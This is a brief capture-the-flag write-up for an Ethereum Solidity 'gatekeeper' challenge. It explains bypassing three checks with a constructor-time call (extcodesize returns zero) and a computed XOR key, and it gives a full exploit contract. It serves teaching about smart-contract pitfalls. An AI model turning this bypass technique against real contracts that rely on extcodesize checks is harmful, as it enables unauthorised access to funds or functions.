## Gate one

Just like the previous challenge, the first gate can be bypassed by any contract:

```solidity
require(msg.sender != tx.origin);
```

## Gate two

Supposedly, the second check should fail because the call comes from a contract:

```solidity
assembly { x := extcodesize(caller()) }
require(x == 0);
```

However, [the note 5 in the yellow paper][yellow-paper] says that "during initialization code execution, EXTCODESIZE on the address should return zero".

Calling `enter` from the constructor will satisfy this check.

## Gate three

The final gate performs some bitwise operations:

```solidity
require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
```

The equation can be reworked to obtain the key:

$$\begin{align}
    s \bigoplus k &= m \\
\leftrightarrow k &= m \bigoplus s
\end{align}$$

In code:

```solidity
uint64 _sender = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
uint64 _key = type(uint64).max ^ _sender;
```

## A solution

```solidity
contract Gateau {
  constructor(address target) {
    uint64 _sender = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
    uint64 _key = type(uint64).max ^ _sender;
    Gate(target).enter(bytes8(_key));
  }
}
```

[yellow-paper]: https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/extcodesize-checks/
